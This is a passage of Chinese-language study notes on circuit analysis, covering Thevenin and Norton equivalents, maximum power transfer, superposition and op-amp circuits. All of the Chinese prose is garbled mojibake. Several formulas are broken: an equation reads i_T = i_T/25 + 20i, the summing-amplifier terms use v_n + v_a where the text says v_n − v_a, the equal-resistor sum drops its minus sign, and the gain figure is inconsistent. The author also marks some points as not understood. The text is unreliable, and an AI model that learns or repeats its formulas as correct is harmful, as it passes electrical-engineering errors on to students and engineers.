$R_{Th}$</p><blockquote><p>æ±‚è§£æ­¥éª¤</p></blockquote><p>å°†ç«¯å­ <mark>å¼€è·¯</mark> æ±‚ $V_{Th}$. (ç«¯å­ä¸¤ä¾§çš„ç”µå‹å°±æ˜¯ç­‰æ•ˆç”µè·¯çš„æ–­è·¯ç”µå‹)</p><p>å°†ç«¯å­ <mark>çŸ­è·¯</mark> æ±‚ $i_{sc}$ (ç«¯å­ä¸¤ä¾§æµè¿‡çš„ç”µæµå°±æ˜¯çŸ­è·¯ç”µæµ)</p><p>åˆ©ç”¨ $V_{Th}$ å’Œ $i_{sc}$ æ±‚ $R_{Th}$</p><p><img src="/../img/example_of_Thevenin_circuit.png"></p><h3 id="4-10-2-è¯ºé¡¿ç­‰æ•ˆç”µè·¯"><a href="#4-10-2-è¯ºé¡¿ç­‰æ•ˆç”µè·¯" class="headerlink" title="4.10.2 è¯ºé¡¿ç­‰æ•ˆç”µè·¯"></a>4.10.2 è¯ºé¡¿ç­‰æ•ˆç”µè·¯</h3><p>è¯ºé¡¿ç­‰æ•ˆç”µè·¯ç”± <mark>ä¸€ä¸ªç‹¬ç«‹ç”µæµæºå’Œè¯ºé¡¿ç­‰æ•ˆç”µé˜»å¹¶è”ç»„æˆ</mark>, å¯ä»¥å…ˆåˆ©ç”¨ <mark>ç”µæºå˜æ¢</mark>  å°†è¯ºé¡¿ç­‰æ•ˆç”µè·¯æ¢æˆæˆ´ç»´å—ç­‰æ•ˆç”µè·¯.</p><h3 id="4-10-3-ä½¿ç”¨ç”µæºå˜æ¢ç”µè·¯"><a href="#4-10-3-ä½¿ç”¨ç”µæºå˜æ¢ç”µè·¯" class="headerlink" title="4.10.3 ä½¿ç”¨ç”µæºå˜æ¢ç”µè·¯"></a>4.10.3 ä½¿ç”¨ç”µæºå˜æ¢ç”µè·¯</h3><p>ç¤ºä¾‹:</p><p><img src="/../img/example_of_source_transformation_4102.png"></p><p>è¿™é“é¢˜çš„å…³é”®åœ¨äº <mark> $i_x$ çš„ç”µæµä¸€å®šä¸ºé›¶ </mark> (ç¼ºå°‘è¿”å›å·¦è¾¹éƒ¨åˆ†ç”µè·¯çš„è·¯å¾„)</p><h2 id="4-11-å¯¼å‡ºæˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„è¡¥å……"><a href="#4-11-å¯¼å‡ºæˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„è¡¥å……" class="headerlink" title="4.11 å¯¼å‡ºæˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„è¡¥å……"></a>4.11 å¯¼å‡ºæˆ´ç»´å—ç­‰æ•ˆç”µè·¯çš„è¡¥å……</h2><p>æ±‚ $R_{Th}$ å¹¶ä¸æ€»æ˜¯å¾ˆå®¹æ˜“.</p><h3 id="æ±‚-R-Th-æŠ€å·§1-è‹¥ç”µè·¯ä¸­ä»…ä»…åŒ…å«ç‹¬ç«‹æº"><a href="#æ±‚-R-Th-æŠ€å·§1-è‹¥ç”µè·¯ä¸­ä»…ä»…åŒ…å«ç‹¬ç«‹æº" class="headerlink" title="æ±‚ $R_{Th}$ æŠ€å·§1 è‹¥ç”µè·¯ä¸­ä»…ä»…åŒ…å«ç‹¬ç«‹æº"></a>æ±‚ $R_{Th}$ æŠ€å·§1 è‹¥ç”µè·¯ä¸­ä»…ä»…åŒ…å«ç‹¬ç«‹æº</h3><p><mark>å…ˆä½¿ç‹¬ç«‹æºæ— æ•ˆ</mark> (ç”µå‹æºæ— æ•ˆæ˜¯å°†å…¶çŸ­è·¯, ç”µæµæºæ— æ•ˆæ˜¯å°†å…¶å¼€è·¯) ç„¶åè®¡ç®—ä»æŒ‡å®šç«¯å£çœ‹è¿›å»çš„ç”µé˜»:</p><p>å¦‚:</p><p><img src="/../img/trick1_to_get_Thevenin_resistance1.png"></p><p>å˜ä¸º:</p><p><img src="/../img/trick1_to_get_Thevenin_resistance2.png"></p><p>$$<br>\displaylines{R_{ab} &#x3D; R_{Th} &#x3D; 4 + \frac{5 \times 20}{25} &#x3D; 8 \Omega}<br>$$</p><h3 id="æ±‚-R-Th-æŠ€å·§2-è‹¥ç”µè·¯ä¸­å«éç‹¬ç«‹ç”µæº"><a href="#æ±‚-R-Th-æŠ€å·§2-è‹¥ç”µè·¯ä¸­å«éç‹¬ç«‹ç”µæº" class="headerlink" title="æ±‚ $R_{Th}$ æŠ€å·§2 è‹¥ç”µè·¯ä¸­å«éç‹¬ç«‹ç”µæº"></a>æ±‚ $R_{Th}$ æŠ€å·§2 è‹¥ç”µè·¯ä¸­å«éç‹¬ç«‹ç”µæº</h3><p>é¦–å…ˆä½¿æ‰€æœ‰ <mark>ç‹¬ç«‹ç”µæºæ— æ•ˆ</mark>.</p><p>ç„¶ååœ¨ a,b ç«¯æ–½åŠ ä¸€ä¸ªæµ‹è¯•ç”µå‹æºæˆ–æµ‹è¯•ç”µæµæºï¼Œæˆ´ç»´å—ç”µé˜»ç­‰äºæµ‹è¯•ç”µæºä¸Šçš„ç”µå‹ä¸æµ‹è¯•ç”µæºé‡Šæ”¾çš„ç”µæµåªæ¯”</p><p><img src="/../img/example_of_source_transformation_4102.png"></p><p>å˜ä¸º:</p><p><img src="/../img/alternating_method_to_calculate_Thevenin_resistance.png"></p><blockquote><p>æ±‚è§£</p></blockquote><p>æµ‹è¯•ç”µå‹è®°ä¸º $V_T$, ç”±å®ƒäº§ç”Ÿçš„ç”µæµè®°ä¸º $i_T$.</p><p>$$<br>\displaylines{i_T &#x3D; \frac{i_T}{25} + 20i \newline~ \newline<br>i &#x3D; \frac{-3v_T}{2000}A \newline~ \newline<br>i_T &#x3D; \frac{v_T}{25} - \frac{60v_T}{2000} \newline~ \newline<br>\frac{i_T}{v_T} &#x3D; \frac{1}{25}- \frac{6}{200} &#x3D; \frac{50}{5000} &#x3D; \frac{1}{100} \newline~ \newline<br>R_Th &#x3D; \frac{v_T}{i_T} &#x3D; 100 \Omega}<br>$$</p><h2 id="4-12-æœ€å¤§åŠŸç‡ä¼ è¾“"><a href="#4-12-æœ€å¤§åŠŸç‡ä¼ è¾“" class="headerlink" title="4.12 æœ€å¤§åŠŸç‡ä¼ è¾“"></a>4.12 æœ€å¤§åŠŸç‡ä¼ è¾“</h2><p>ä¼ è¾“å°½å¯èƒ½å¤šçš„åŠŸç‡åˆ°è´Ÿè½½æ˜¯äººä»¬æ‰€æœŸæœ›çš„.</p><p>è®¤ä¸ºè´Ÿè½½ç”µè·¯æ€»èƒ½è½¬æ¢ä¸ºæˆ´ç»´å—ç”µè·¯.</p><p>ç”µè·¯å¦‚ä¸‹:</p><p><img src="/../img/max_power_circuit.png"></p><p>è½¬æ¢ä¸ºæˆ´ç»´å—ç”µè·¯ä¸º:</p><p><img src="/../img/max_power_circuit_transformation_to_Thevenin_circuit.png"></p><blockquote><p>æ¨å¯¼:</p></blockquote><p>$$<br>\displaylines{p &#x3D; i^2 R_L &#x3D; ( \frac{V_{Th}}{R_{Th} + R_L} )^2 R_L \newline~ \newline<br>The\ value\ of\ V_{Th}\ and\ R_{Th}\ will\ not\ change\ ,\ so\ the\ power\ is\ a\ function\ of\ R_L\ ,\ using\ derivative\ to\ get\ the\ maximum\ value \newline~ \newline<br>\frac{dP}{dR_L} &#x3D; V^2_{Th}[ \frac{(R_{Th} + R_L)^2 - R_L \cdot 2(R_{Th} + R_L)}{(R_Th + R_L)^4} ] \newline~ \newline<br>When\ the\ derivative\ equel\ to\ zero\ p\ is\ maximum \newline~ \newline<br>(R_{Th} + R_L)^2 &#x3D; 2R_L (R_{Th} + R_L) \newline~ \newline<br>R_L &#x3D; R_{Th} \newline~ \newline<br>\therefore p_{max} &#x3D; \frac{V^2_{Th} R_L}{(2R_L)^2}&#x3D; \frac{V^2_{Th}}{4R_L}}<br>$$</p><h2 id="4-13-å åŠ åŸç†"><a href="#4-13-å åŠ åŸç†" class="headerlink" title="4.13 å åŠ åŸç†"></a>4.13 å åŠ åŸç†</h2><p>å¦‚æœç”µè·¯ä¸­çš„ç‹¬ç«‹æºæ˜¯æ ¹æœ¬ä¸åŒçš„ï¼Œæ‰éœ€è¦ä½¿ç”¨å åŠ åŸç†.</p><p>å åŠ åŸç†å°±æ˜¯ä¸€ä¸ªç”µæºä¸€ä¸ªç”µæºåœ°åˆ†æï¼Œ <mark>åˆ†æå…¶ä¸­ä¸€ä¸ªæ—¶ï¼Œä½¿å…¶ä»–ç”µæºæ— æ•ˆ</mark> (ä½†æ˜¯ï¼Œéç‹¬ç«‹æºä»ä¸æ— æ•ˆ).</p><p>å¦‚è¿™ä¸ªç”µè·¯, æœ‰ä¸¤ä¸ªç‹¬ç«‹æº, éœ€è¦æ±‚ $i_1 \sim i_4$ çš„å€¼:</p><p><img src="/../img/superposition_principle1.png"></p><p>å…ˆç”¨ç”µå‹æºæ— æ•ˆå°±ä½¿å…¶çŸ­è·¯ï¼Œç”µæµæºæ— æ•ˆå°±ä½¿å…¶å¼€è·¯çš„æ–¹å¼ï¼Œå…ˆåˆ†æç”µå‹æºï¼Œåˆ™å¼€è·¯ç”µæµæº:</p><p><img src="/../img/superposition_principle2.png"></p><p>å¯ä»¥æ±‚å¾— $i^\prime_1 \sim i^\prime_4$.</p><p>å†åˆ†æç”µæµæºï¼Œéœ€è¦å°†ç”µå‹æºçŸ­è·¯:</p><p><img src="/../img/superposition_principle3.png"></p><p>å¯ä»¥æ±‚å¾— $i_1^{\prime \prime} \sim i_4^{\prime \prime}$.</p><p>åˆ™æ±‚åŸç”µè·¯çš„æ”¯è·¯ç”µæµï¼Œå°†ä¸¤æ¬¡åˆ†æçš„ç›¸åŠ å³å¯:</p><p>$$<br>\displaylines{i_1 &#x3D; i_1^{\prime} + i_1^{\prime \prime} \newline~ \newline<br>i_2 &#x3D; i_2^{\prime} + i_2^{\prime \prime} \newline~ \newline<br>i_3 &#x3D; i_3^{\prime} + i_3^{\prime \prime} \newline~ \newline<br>i_4 &#x3D; i_4^{\prime} + i_4^{\prime \prime} \newline~ \newline}<br>$$</p><p><mark>éç‹¬ç«‹ç”µå‹æºçš„å†…é˜»ä¼¼ä¹ä¹Ÿæ˜¯æ— ç©·å¤§</mark> </p><h1 id="ç¬¬5ç« -è¿ç®—æ”¾å¤§å™¨"><a href="#ç¬¬5ç« -è¿ç®—æ”¾å¤§å™¨" class="headerlink" title="ç¬¬5ç«  è¿ç®—æ”¾å¤§å™¨"></a>ç¬¬5ç«  è¿ç®—æ”¾å¤§å™¨</h1><p>è¿ç®—æ”¾å¤§å™¨å¯ç®€ç§°ä¸º <mark>è¿æ”¾</mark> .<br>(è¿™é‡Œå†…éƒ¨è®²å¾—ä¸å¤ªå¤š, ä¸»è¦éœ€è¦è®°ä½ç‰¹æ€§)</p><p><mark>æ”¾å¤§å™¨æ˜¯å°†ä»€ä¹ˆæ”¾å¤§äº†?</mark></p><p>æ”¾å¤§çš„æ˜¯æ­£ç›¸è¾“å…¥å’Œåç›¸è¾“å…¥çš„å·®å€¼. å³ $A(v_p - v_n)$ (è™½ç„¶å°†è¿™ä¸¤ç«¯çš„ç”µæµç”µå‹è§†ä¸ºé›¶)</p><h2 id="5-1-è¿ç®—æ”¾å¤§å™¨ç«¯å­"><a href="#5-1-è¿ç®—æ”¾å¤§å™¨ç«¯å­" class="headerlink" title="5.1 è¿ç®—æ”¾å¤§å™¨ç«¯å­"></a>5.1 è¿ç®—æ”¾å¤§å™¨ç«¯å­</h2><p>ç¾å›½ä»™ç«¥åŠå¯¼ä½“å…¬å¸æ¨å‡ºçš„ä¸€ç§è¢«å¹¿æ³›æ¥å—çš„è¿æ”¾: $\mu A741$</p><p>è‹¥æ˜¯ 8 å¼•è„šåŒåˆ—ç›´æ’å¼ (Double In-line Pin, DIP)</p><p>ç¤ºæ„å›¾:</p><p><img src="/../img/diagram_of_DIP_operational_Amplifier.png"></p><p><mark>NC</mark> (Non-Connection) è¡¨ç¤ºæ²¡æœ‰è¿æ¥ï¼Œæ˜¯ä¸€ä¸ªä¸ç”¨çš„ç«¯å­.</p><p>ä¸»è¦å…³å¿ƒçš„å¼•è„šåŒ…æ‹¬:</p><ul><li>åç›¸è¾“å…¥</li><li>åŒç›¸è¾“å…¥</li><li>è¾“å‡º</li><li>æ­£ç”µæº ( $V^+$ )</li><li>è´Ÿç”µæº ( $V^-$ )</li></ul><p>ç”µè·¯ç¬¦å·:</p><p><img src="/../img/diagram_of_operational_Amplifier.png"></p><h2 id="5-2-ç«¯ç”µå‹å’Œç«¯ç”µæµ"><a href="#5-2-ç«¯ç”µå‹å’Œç«¯ç”µæµ" class="headerlink" title="5.2 ç«¯ç”µå‹å’Œç«¯ç”µæµ"></a>5.2 ç«¯ç”µå‹å’Œç«¯ç”µæµ</h2><p>ä¸‰ä¸ªç‰¹ç‚¹:</p><ul><li>è¾“å‡ºç”µå‹ä¸å¤§äºç”µå‹æºç”µå‹</li><li>æ­£ç›¸&#x2F;åç›¸è¾“å…¥ç«¯ç”µå‹ä¸ºé›¶</li><li>æ­£ç›¸&#x2F;åç›¸è¾“å…¥ç«¯ç”µæµä¸ºé›¶</li></ul><p>ä¸€èˆ¬ç¤ºæ„å›¾ä¸º:</p><p><img src="/../img/Operational_Amplifier_five_port_circuit"></p><p>æ‰€æœ‰ç”µæµçš„å‚è€ƒæ–¹å‘æ˜¯<mark>è¿›å…¥è¿ç®—æ–¹æ³•å™¨çš„ç«¯å­</mark>.</p><blockquote><p>ç”µå‹çº¦æŸ</p></blockquote><p>è¾“å‡ºç”µå‹æ»¡è¶³çš„æ›²çº¿:</p><p><img src="/../img/characteristic_curve_of_output_of_Operational_Amplifier.png"></p><p>å¯ä»¥çœ‹å‡º, è¾“å‡ºç”µå‹æœ€å¤§ä¸ä¼šè¶…è¿‡æ­£ç”µæºç”µå‹ï¼Œæœ€å°ç”µæºä¸ä¼šè¶…è¿‡è´Ÿç”µæºç”µå‹ï¼Œä¸­é—´ä¸ºçº¿æ€§å¢é•¿. ä¸”è¾“å‡ºç”µå‹ä¸º $A(v_p-v_n)$, å³ä¸¤è¾“å…¥ç”µå‹ä¹‹å·®ä¹˜ä»¥ä¸€ä¸ªå¸¸æ•°, å³ <mark>å¢ç›Š A</mark> .</p><p>æè¿°æ–¹ç¨‹ä¸º, è¿™é‡Œçš„ $v_p$ æ˜¯æ­£ç›¸è¾“å…¥ï¼Œ $v_n$ æ˜¯åç›¸è¾“å…¥:<br>$$<br>\displaylines{V_0 &#x3D;<br>\begin{cases}<br>-V_{CC} \ \ A(v_p-v_n) &lt; -V_{CC} \newline~ \newline<br>A(v_p - v_n) -V_{CC} \le A(v_p-v_n) \le +V_CC \newline~ \newline<br>+V_{CC} \ \ A(v_p-v_n) &gt; +V_{CC}<br>\end{cases}}<br>$$</p><p><mark>å¯¹äºå¤šæ•°è¿æ”¾</mark>, æ¨èçš„ç›´æµç”µæºç”µå‹ <mark>è¶…è¿‡ 20V</mark> , å¢ç›Š A å¾ˆå°‘ <mark>ä½äº 10000</mark> (ç†æƒ³çš„è¿æ”¾ A å€¼æ— ç©·å¤§). è¿™æ„å‘³ç€ $A(v_p-v_n) &lt; 20V$, å³:<br>$$<br>\displaylines{v_p - v_n &lt; \frac{20}{20000} &#x3D; 2mV}<br>$$</p><p>å› æ­¤ï¼Œä¸¤ä¸ªç”µå‹åŸºæœ¬ç›¸ç­‰:<br>$$<br>\displaylines{v_p &#x3D; v_n}<br>$$</p><blockquote><p>ç”µæµçº¦æŸ</p></blockquote><p>ä»è¿æ”¾è¾“å…¥ç«¯çœ‹è¿›å»çš„<mark>ç­‰æ•ˆç”µé˜»éå¸¸å¤§</mark>, å…¸å‹å€¼ä¸º $1M\Omega$ æˆ–æ›´å¤§ï¼Œç†æƒ³æƒ…å†µä¸‹ä¸ºæ— ç©·å¤§, å› æ­¤:</p><p><img src="/../img/Operational_Amplifier_five_port_circuit"></p><p>$$<br>\displaylines{i_p &#x3D; i_n &#x3D; 0 \newline~ \newline<br>\because åŸºå°”éœå¤«ç”µæµå®šå¾‹ \newline~ \newline<br>i_p + i_n + i_o + i_{c+} + i_{c-} &#x3D; 0 \newline~ \newline<br>i_o &#x3D; -{i_{c+} + i_{c-}}}<br>$$</p><p>å¯çŸ¥ï¼Œ $i_p &#x3D; i_n &#x3D; 0$  ä½†ä¸ä»£è¡¨è¾“å‡ºç”µæµ $i_o$ ç­‰äº 0.</p><blockquote><p>è´Ÿåé¦ˆçš„ä½œç”¨</p></blockquote><p>å¦‚æœè¿æ”¾å—åˆ°ç”µè·¯é™åˆ¶ï¼Œä¸èƒ½æä¾›ä¸€æ¡åé¦ˆè·¯å¾„ä»è¿æ”¾çš„è¾“å‡ºåˆ°åç›¸è¾“å…¥ç«¯ï¼Œé‚£ä¹ˆ<mark>è¿æ”¾é€šå¸¸ä¼šé¥±å’Œ</mark>.</p><p>æ„æ€å°±æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æœ‰:<br>$$<br>\displaylines{A(v_p - v_n) &gt; +V_{cc}}<br>$$<br>ä¹Ÿå°±æ˜¯é¥±å’Œ.</p><p>ä¸ºäº†è®©è¾“å‡ºç”µå‹ä¸é¥±å’Œï¼Œä¹Ÿå°±æ˜¯åœ¨çº¿æ€§åŒºï¼Œéœ€è¦ <mark>å‡å°è¾“å…¥ç”µå‹å·®</mark>. (ä¸æ˜¯å¾ˆæ˜ç™½, æš‚æ—¶åˆ—ä¸º <mark>ç–‘æƒ‘ç‚¹</mark> )</p><h2 id="5-3-åç›¸æ”¾å¤§å™¨ç”µè·¯"><a href="#5-3-åç›¸æ”¾å¤§å™¨ç”µè·¯" class="headerlink" title="5.3 åç›¸æ”¾å¤§å™¨ç”µè·¯"></a>5.3 åç›¸æ”¾å¤§å™¨ç”µè·¯</h2><p><mark>åç§°ç¼˜ç”±</mark>: è¾“å‡ºç”µå‹çš„å€¼å’Œåç›¸è¾“å…¥ç«¯çš„ç”µå‹ç›¸å…³, å’Œæ­£ç›¸è¾“å…¥ç«¯çš„ç”µå‹æ— å…³. (è¿™ä¸ªåå­—ä¸”æš—ç¤ºäº†è¾“å…¥ç”µå‹çš„ä½ç½®, è¿™é‡Œåœ¨åç›¸è¾“å…¥ç«¯çš„æ”¯è·¯)</p><blockquote><p>é—­ç¯çŠ¶æ€</p></blockquote><p>ç‰¹ç‚¹ (å‰ä¸¤ç‚¹ä¹Ÿåæ˜ äº†åå­—çš„ç”±æ¥):</p><ul><li>è¾“å…¥ç”µå‹æ¥åç›¸è¾“å…¥ç«¯å£.</li><li>è¾“å‡ºç”µå‹å’Œè¾“å…¥ç”µå‹ (ä¸æ˜¯ç”µæºç”µå‹) ç¬¦å·ç›¸å. ä¸”æœ‰å…³ç³»å¼ä¸º:<br>$$<br>\displaylines{ \frac{v_o}{v_s} &#x3D; - \frac{R_f}{R_s} }<br>$$</li><li>å¢ç›Šä¸º:<br>$$<br>\displaylines{ \frac{R_f}{R_s} }<br>$$</li></ul><p><img src="/../img/inverse_operational_amplifier.png"></p><blockquote><p>æ¨å¯¼<br>é¦–å…ˆéœ€è¦çŸ¥é“, å‡è®¾åç›¸è¾“å…¥å¤–çš„é‚£ä¸ªèŠ‚ç‚¹ç”µåŠ¿ä¸ºé›¶. (ä¸ºä»€ä¹ˆä¸ºé›¶ä¸æ¸…æ¥š)</p></blockquote><p>$$<br>\displaylines{i_s + i_f &#x3D; i_n \newline~ \newline<br>i_n &#x3D; 0 \newline~ \newline<br>i_s &#x3D; \frac{v_s}{R_s} \newline~ \newline<br>i_f &#x3D; \frac{v_0}{R_f} \newline~ \newline<br>\frac{v_s}{R_s} + \frac{v_0}{R_f} &#x3D; 0 \newline~ \newline<br>\frac{v_0}{v_s} &#x3D; - \frac{R_f}{R_s}}<br>$$</p><p>å…³äºä¸ºä»€ä¹ˆ $i_f &#x3D; \frac{v_0}{R_f}$ , çœ‹è¿™é‡Œ:</p><p><img src="/../img/why_i0_v0_Rf.png"></p><blockquote><p>åç›¸æ”¾å¤§å™¨å¼€ç¯çŠ¶æ€</p></blockquote><p>ç‰¹ç‚¹:</p><ul><li>$v_0 &#x3D; -A(v_p - v_n) &#x3D; - Av_n, \ \ v_p &#x3D; 0,\ \ v_n \approx v_s$</li><li>$\left\vert v_s \right\vert &lt; \frac{V_cc}{A}$</li></ul><p>å› ä¸ºåç›¸è¾“å…¥ç”µæµå‡ ä¹ä¸ºé›¶ï¼Œ $R$ ä¸Šçš„å‹é™</p><p>æ­¤æ—¶çš„ A ç§°ä¸ºå¼€ç¯å¢ç›Š.</p><p><img src="/../img/reverse_op_amp_open_loop_gain.png"></p><h2 id="5-4-æ±‚å’Œæ”¾å¤§ç”µè·¯"><a href="#5-4-æ±‚å’Œæ”¾å¤§ç”µè·¯" class="headerlink" title="5.4 æ±‚å’Œæ”¾å¤§ç”µè·¯"></a>5.4 æ±‚å’Œæ”¾å¤§ç”µè·¯</h2><p>ç‰¹ç‚¹:</p><ul><li>æ±‚å’Œæ”¾å¤§ç”µè·¯çš„è¾“å‡ºç”µå‹æ˜¯ <mark>åç›¸çš„</mark>.</li><li>å½“ $R_f &#x3D; R_a &#x3D; R_b &#x3D; R_c$ æ—¶ï¼Œè¾“å‡ºç”µå‹æ˜¯è¾“å…¥ç”µå‹ä¹‹å’Œ</li></ul><p>å›¾åƒ:</p><p><img src="/../img/add_operational_amplifier.png"></p><p>æ³¨æ„è¿™é‡Œæ ‡è¯†çš„ $v_n$ æ˜¯åç›¸è¾“å…¥ç«¯çš„ç”µå‹ï¼Œæ­£ç›¸è¾“å…¥ç«¯ä¸º 0 . å› æ­¤åˆ©ç”¨åŸºå°”éœå¤«ç”µæµå®šå¾‹:<br>$$<br>\displaylines{ \frac{v_n + v_a}{R_a} + \frac{v_n + v_b}{R_b} + \frac{v_n + v_c}{R_c} + \frac{v_n + v_0}{R_f} + i_n \newline~ \newline<br>v_0 &#x3D; - ( \frac{R_f}{R_a}v_a + \frac{R_f}{R_b}v_n + \frac{R_f}{R_c}v_c )}<br>$$</p><p>å¦‚ $v_n - v_a$ å°±æ˜¯ $R_a$ æ‰€åœ¨æ”¯è·¯åœ¨ $R_a$ ä¸Šçš„å‹é™.</p><p>è‹¥ $R_f &#x3D; R_a &#x3D; R_b &#x3D; R_c$, åˆ™ï¼š<br>$$<br>\displaylines{v_0 &#x3D; (v_a + v_b + v_c)}<br>$$</p><h2 id="5-5-åŒç›¸æ”¾å¤§å™¨ç”µè·¯"><a href="#5-5-åŒç›¸æ”¾å¤§å™¨ç”µè·¯" class="headerlink" title="5.5 åŒç›¸æ”¾å¤§å™¨ç”µè·¯"></a>5.5 åŒç›¸æ”¾å¤§å™¨ç”µè·¯</h2><p>ç‰¹ç‚¹:</p><ul><li>è¾“å…¥ç”µå‹åœ¨åŒç›¸è¾“å…¥ç«¯ï¼Œè¾“å‡ºç”µå‹ä¸è¾“å…¥ç”µå‹ç¬¦å·ç›¸åŒ</li></ul><p>å›¾åƒ:</p><p><img src="/../img/noninverse_ope_amp.png"></p><p>è¯´æ˜¯å½¢æˆäº†ä¸€ä¸ªç©ºè½½åˆ†å‹å™¨ (ä¸æ˜¯å¾ˆæ‡‚):</p><p>$$<br>\displaylines{v_n &#x3D; v_g &#x3D; \frac{v_0 R_s}{R_s + R_f} \newline~ \newline<br>v_o &#x3D; \frac{R_s + R_f}{R_s} v_g}<br>$$</p><p>æ­¤æ—¶çš„å¢ç›Šä¸º:<br>$$<br>\displaylines{ \frac{R_s + R_f}{R_s} }<br>$$</p><p>å› æ­¤æ»¡è¶³:<br>$$<br>\displaylines{ \left\vert   \frac{R_s + R_f}{R_s} v_g &lt; V_CC  \right\vert }<br>$$</p><h2 id="5-6-å·®åˆ†æ”¾å¤§å™¨"><a href="#5-6-å·®åˆ†æ”¾å¤§å™¨" class="headerlink" title="5.6 å·®åˆ†æ”¾å¤§å™¨"></a>5.6 å·®åˆ†æ”¾å¤§å™¨</h2><p>ç‰¹ç‚¹:</p><ul><li>æ­£ç›¸å’Œåç›¸è¾“å…¥ç«¯éƒ½æœ‰è¾“å…¥ç”µå‹ </li><li>è¾“å‡ºç”µå‹ä¸ä¸¤ä¸ªè¾“å…¥ç”µå‹çš„å·®æˆæ¯”ä¾‹</li></ul><p>å›¾åƒ:</p><p><img src="/../img/diffence_ope_amp.png"></p><p>å¯¹ç¦»å¼€åç›¸è¾“å…¥èŠ‚ç‚¹çš„ç”µæµåº”ç”¨åŸºå°”éœå¤«å®šå¾‹ç”µæµå®šå¾‹:</p><p>$$<br>\displaylines{ \frac{v_n - v_a}{R_a} + \frac{v_n - v_b}{R_b} + i_n &#x3D; 0 \newline~ \newline<br>i_n &#x3D; i_p &#x3D; 0 \newline~ \newline<br>v_n &#x3D; v_p &#x3D; \frac{R_d}{R_c + R_d}v_b \newline~ \newline<br>v_o &#x3D; \frac{R_d(R_a + R_b)}{R_a (R_c + R_d)} v_b - \frac{R_b}{R_a} v_a \newline~ \newline<br>when\ \ \newline~ \newline<br>\frac{R_a}{R_b} &#x3D; \frac{R_c}{R_d} \newline~ \newline<br>v_o &#x3D; \frac{R_b}{R_a} (v_b -v_a)}<br>$$</p><h3 id="5-6-1-å…³äºå·®åˆ†æ”¾å¤§å™¨çš„å…¶ä»–é—®é¢˜"><a href="#5-6-1-å…³äºå·®åˆ†æ”¾å¤§å™¨çš„å…¶ä»–é—®é¢˜" class="headerlink" title="5.6.1 å…³äºå·®åˆ†æ”¾å¤§å™¨çš„å…¶ä»–é—®é¢˜"></a>5.6.1 å…³äºå·®åˆ†æ”¾å¤§å™¨çš„å…¶ä»–é—®é¢˜</h3><p><mark>å·®æ¨¡è¾“å…¥</mark>, å³ä¸¤ä¸ªè¾“å…¥ç”µå‹ä¹‹é—´çš„å·® :</p><p>$$<br>\displaylines{v_{dm} &#x3D; v_b - v_a}<br>$$</p><p><mark>å…±æ¨¡è¾“å…¥</mark>, å³ä¸¤ä¸ªè¾“å…¥ç”µå‹çš„å¹³å‡å€¼:</p><p>$$<br>\displaylines{v_{cm} &#x3D; \frac{v_a + v_b}{2}}<br>$$</p><h3 id="5-6-2-è¡¡é‡å·®åˆ†æ”¾å¤§å™¨çš„å…±æ¨¡æŠ‘åˆ¶æ¯”"><a href="#5-6-2-è¡¡é‡å·®åˆ†æ”¾å¤§å™¨çš„å…±æ¨¡æŠ‘åˆ¶æ¯”" class="headerlink" title="5.6.2 è¡¡é‡å·®åˆ†æ”¾å¤§å™¨çš„å…±æ¨¡æŠ‘åˆ¶æ¯”"></a>5.6.2 è¡¡é‡å·®åˆ†æ”¾å¤§å™¨çš„å…±æ¨¡æŠ‘åˆ¶æ¯”</h3><p>è¿™ä¸¤å°èŠ‚è§ä¹¦ï¼Œä¸æ˜¯å¾ˆæ˜ç™½.</p><h2 id="5-7-å®é™…çš„è¿ç®—æ”¾å¤§å™¨æ¨¡å‹"><a href="#5-7-å®é™…çš„è¿ç®—æ”¾å¤§å™¨æ¨¡å‹" class="headerlink" title="5.7 å®é™…çš„è¿ç®—æ”¾å¤§å™¨æ¨¡å‹"></a>5.7 å®é™…çš„è¿ç®—æ”¾å¤§å™¨æ¨¡å‹</h2><p>å‡ å¤„ä¸åŒ:</p><ul><li>æœ‰é™çš„è¾“å…¥ç”µé˜» $R_i$</li><li>æœ‰é™çš„å¼€ç¯å¢ç›Š A</li><li>éé›¶çš„è¾“å‡ºç”µé˜» $R_o$</li></ul><p>æ„å‘³ç€å‡ ä¸ªå‡è®¾ä¸æˆç«‹:</p><ul><li>$v_n &#x3D; v_p$</li><li>i_n &#x3D; i_p &#x3D; 0</li></ul><p>å›¾åƒ:</p><p><img src="/../img/real_model_of_ope_amp.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå†…éƒ¨æœ‰ä¸€ä¸ª <mark>éç‹¬ç«‹æº</mark> , æ¨¡æ‹Ÿçš„å°±æ˜¯æ”¾å¤§åçš„ç”µå‹, æœ‰ç”µé˜» $R_o$ æ„å‘³ç€è¾“å‡ºçš„ç”µå‹ä¼šè¢« $R_o$ åˆ†å‹.</p><h3 id="5-7-1-ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåç›¸æ”¾å¤§å™¨ç”µè·¯"><a href="#5-7-1-ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåç›¸æ”¾å¤§å™¨ç”µè·¯" class="headerlink" title="5.7.1 ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåç›¸æ”¾å¤§å™¨ç”µè·¯"></a>5.7.1 ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåç›¸æ”¾å¤§å™¨ç”µè·¯</h3><p>å›¾åƒä¸º:</p><p><img src="/../img/real_inverse_ope_amp.png"></p><p>åˆ©ç”¨åŸºå°”éœå¤«ç”µæµå®šå¾‹å¾—åˆ°ä¸¤ä¸ªæ–¹ç¨‹:</p><p>$$<br>\displaylines{èŠ‚ç‚¹a: \ \frac{v_n - v_s}{R_s} + \frac{v_n }{R_i} + \frac{v_n - v_o}{R_f} &#x3D; 0 \newline~ \newline<br>èŠ‚ç‚¹b: \ \frac{v_o - v_n}{R_f} + \frac{v_o - A(-v_n)}{R_o} &#x3D; 0}<br>$$</p><p>è§£å‡ºçš„æ–¹ç¨‹æœ‰ç‚¹å¤æ‚:</p><p><img src="/../img/the_final_equation_of_real_inverse_ope_amp.png"></p><h3 id="5-7-2-ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåŒç›¸æ”¾å¤§å™¨ç”µè·¯"><a href="#5-7-2-ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåŒç›¸æ”¾å¤§å™¨ç”µè·¯" class="headerlink" title="5.7.2 